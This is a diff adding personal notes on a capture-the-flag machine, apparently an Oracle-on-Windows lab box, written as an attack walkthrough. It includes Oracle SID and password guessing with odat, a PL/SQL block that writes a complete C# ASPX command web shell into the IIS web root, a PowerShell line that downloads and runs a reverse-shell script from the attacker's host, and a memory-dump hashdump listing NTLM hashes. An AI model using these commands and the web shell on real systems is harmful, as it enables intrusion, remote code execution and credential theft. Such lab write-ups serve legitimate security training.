@@ -1,0 +1,95 @@
+(love this box, unique oracle attack)
+Hint:
+- unintended way is to use odat.py all the way to the root
+- the user pass file need to also contain the lower case version
+- ? in password could be caused by encoding issue (european, ascii, utf8...)
+
+New tools:
+- odat (oracle database attack tool)
+    - note you have to go through the installation section otherwise the output is wrong
+- volatility (windows dump recover tool)
+
+Logs:
+# init 
+80/tcp    open  http         Microsoft IIS httpd 8.5
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: IIS Windows Server
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC
+49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)
+49161/tcp open  msrpc        Microsoft Windows RPC
+
+# 80 http
+
+# 139,445 smb
+enum4linux, smbclient => nothing without root's passwd
+
+# oracle
+./odat.py sidguesser -s 10.10.10.82
+=> SID: XE,XEXDB
+cat account/account.txt | tr A-Z a-z > tmp.txt
+./odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file tmp.txt
+=> scott/tiger
+
+sqlplus scott/tiger@10.10.10.82:1521/XE
+sqlplus scott/tiger@10.10.10.82:1521/XE as sysdba
+(oracle)
+select * from user_role_privs;
+set serveroutput ON
+SQL> declare
+2     f utl_file.file_type;
+3     s varchar(200);
+4  begin
+5     f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');
+6     utl_file.get_line(f, s);
+7     utl_file.fclose(f);
+8     dbms_output.put_line(s);
+9  end;
+10  /
+
+then write file, find an aspx shell and:
+declare
+    f utl_file.file_type;
+    s varchar(5000) := '<%@ Page Language="C#" Debug="true" Trace="false" %> <%@ Import Namespace="System.Diagnostics" %> <%@ Import Namespace="System.IO" %> <script Language="c#" runat="server"> void Page_Load(object sender, EventArgs e){} string ExcuteCmd(string arg){ ProcessStartInfo psi = new ProcessStartInfo();psi.FileName="cmd.exe";psi.Arguments="/c "+arg;psi.RedirectStandardOutput=true; psi.UseShellExecute = false; Process p = Process.Start(psi); StreamReader stmrdr = p.StandardOutput; string s = stmrdr.ReadToEnd(); stmrdr.Close();return s; } void cmdExe_Click(object sender, System.EventArgs e) { Response.Write("<pre>"); Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text))); Response.Write("</pre>"); } </script> <HTML> <body > <form id="cmd" method="post" runat="server"> <asp:TextBox id="txtArg" runat="server"></asp:TextBox> <asp:Button id="testing" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button> <asp:Label id="lblText" runat="server">Command:</asp:Label> </form> </body> </HTML>';
+begin
+    f := utl_file.fopen('/inetpub/wwwroot', 'test.aspx', 'W');
+    utl_file.put_line(f, s);
+    utl_file.fclose(f);
+end;
+/
+
+# nishang
+(webshell) powershell "IEX(new-object net.webclient).DownloadString('http://10.10.14.19/ps-shell.ps1')"
+
+# priv esc
+Microsoft Windows Server 2012 R2 Standard, x64
+user's desktop => find a passwd: ?%Hm8646uC$
+the '?' is caused by encoding issue
+notice each one char uses two bytes => could be utf-16
+$fc = get-content "xxx.txt"
+[System.Text.Encoding]::Unicode.GetBytes($fc)
+python -> get the password => download file from dropbox
+(or 
+[System.Text.Encoding]::UTF8.GetBytes($fc); $enc_txt = [Convert]::ToBase64String($enc)
+)
+
+google => volatility
+google => --profile=Win2012R2x64
+
+volatility -f SILO-20180105-221806.dmp --profile=Win2012R2x64 hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
+
+
+
+
